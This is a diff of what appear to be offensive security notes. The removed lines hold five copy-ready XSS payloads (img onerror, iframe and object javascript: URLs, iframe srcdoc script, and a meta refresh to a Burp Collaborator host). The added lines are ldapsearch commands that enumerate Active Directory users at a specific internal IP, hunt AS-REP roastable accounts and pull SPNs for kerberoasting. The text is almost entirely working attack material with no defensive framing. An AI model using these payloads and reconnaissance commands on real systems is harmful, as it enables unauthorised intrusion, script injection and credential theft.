@@ -1,27 +1,18 @@
-1. IMG with malformed src & onerror
-json
-Copy
-Edit
-"content": "<img src=1 onerror=alert(document.domain)>"
-2. Using onload with iframe (bypasses <svg>)
-json
-Copy
-Edit
-"content": "<iframe src=javascript:alert('xss')>"
-3. <meta http-equiv> injection (if Open Graph or metadata parsed by SSRF fetcher)
-json
-Copy
-Edit
-"content": "<meta http-equiv='refresh' content='0;url=https://x.burpcollaborator.net'>"
-4. <object> tag fallback
-json
-Copy
-Edit
-"content": "<object data='javascript:alert(1)'></object>"
-5. WASM DOM Sync Bypass Probe (uncommon)
-If WASM app reflects any HTML inside WebAssembly-managed DOM:
+# 0) Confirm the naming context
+ldapsearch -x -H ldap://10.30.7.10:3268 -s base -b "" -LLL defaultNamingContext
 
-json
-Copy
-Edit
-"content": "<iframe srcdoc='<script>alert(`WASM DOM`)</script>'></iframe>"
+# 1) List user objects (full subtree)
+ldapsearch -x -H ldap://10.30.7.10:3268 -b "DC=hero,DC=local" -s sub -LLL \
+'(objectClass=user)' sAMAccountName userPrincipalName servicePrincipalName
+
+# (tighter AD-style user filter; excludes computers)
+ldapsearch -x -H ldap://10.30.7.10:3268 -b "DC=hero,DC=local" -s sub -LLL \
+'(&(objectCategory=Person)(objectClass=User))' sAMAccountName userPrincipalName
+
+# 2) Hunt AS-REP roastable accounts (no preauth)
+ldapsearch -x -H ldap://10.30.7.10:3268 -b "DC=hero,DC=local" -s sub -LLL \
+'(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))' sAMAccountName
+
+# 3) Pull SPNs for kerberoast (works best with creds, but enumerate anyway)
+ldapsearch -x -H ldap://10.30.7.10:3268 -b "DC=hero,DC=local" -s sub -LLL \
+'(servicePrincipalName=*)' sAMAccountName servicePrincipalName
